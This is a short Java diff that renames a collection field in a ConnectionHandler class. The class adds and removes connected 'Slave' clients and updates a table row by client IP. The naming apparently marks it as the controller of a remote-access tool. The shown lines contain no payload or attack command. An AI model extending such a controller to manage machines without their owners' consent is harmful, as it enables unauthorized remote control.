@@ -13,7 +13,7 @@ import com.redpois0n.util.Util;
 public class ConnectionHandler {
 
 	public synchronized static void addSlave(Slave slave) {
-		Main.servers.add(slave);
+		Main.connections.add(slave);
 		
 		Object icon = null;
 		
@@ -37,7 +37,7 @@ public class ConnectionHandler {
 	}
 
 	public static void removeSlave(Slave client, Exception e) {
-		Main.servers.remove(client);
+		Main.connections.remove(client);
 		try {
 			Frame.mainModel.removeRow(Util.getRow(3, client.getIP()));
 		} catch (Exception ex) {
